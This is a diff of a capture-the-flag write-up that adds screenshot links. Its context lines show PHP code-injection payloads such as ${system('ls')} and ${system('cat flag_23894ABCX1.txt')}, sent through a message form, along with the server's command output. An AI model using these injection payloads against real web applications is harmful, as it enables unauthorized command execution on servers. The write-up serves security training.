@@ -34,7 +34,7 @@ ${system('pwd')}
 ```
 
 After sending the request, we will get a response that says:
-
+![alt](../assets/CybertTalents/message/1.png)
 ```html
 /var/www/html Message successfully sent!
 ```
@@ -46,9 +46,8 @@ Lets try to send this payload to the website:
 ```php
 ${system('ls')}
 ```
-
 After sending the request, we will get a response that says:
-
+![alt](../assets/CybertTalents/message/2.png)
 ```html
 about.php contact.php css flag_23894ABCX1.txt footer.php gulpfile.js header.php img index.php js package-lock.json package.json post.php scss vendor Message successfully sent!
 ```
@@ -58,7 +57,7 @@ Here is the flag file, lets read it:
 ```php
 ${system('cat flag_23894ABCX1.txt')}
 ```
-
+![alt](../assets/CybertTalents/message/3.png)
 After sending the request, we will get a response that says:
 
 ```html
